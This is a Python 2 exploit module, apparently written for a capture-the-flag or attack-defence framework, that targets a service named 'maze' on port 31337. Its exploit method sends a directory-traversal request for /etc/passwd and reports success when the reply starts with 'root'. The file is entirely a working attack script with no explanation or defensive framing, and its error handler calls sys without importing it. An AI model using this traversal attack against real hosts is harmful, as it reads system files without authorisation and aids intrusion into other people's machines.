from ExploitFrame import ExploitFrame
import urllib2

class Exploit(ExploitFrame):
    def __init__(self, serviceInfo):
        self.name = 'maze'
        self.output = None
        ExploitFrame.__init__(self, serviceInfo)

    def exploit(self):
        url = "http://{}:31337/../../../../../etc/passwd".format(self.serviceInfo.serviceHost)
        try:
            self.output = urllib2.urlopen(url).read()
        except: # NOQA
            self.output = sys.exc_info()[0].reason

    def exploitSuccess(self):
        print "Exploit Output: {}".format(self.output)
        if self.output and self.output[0:4] == "root":
            return True
        return False
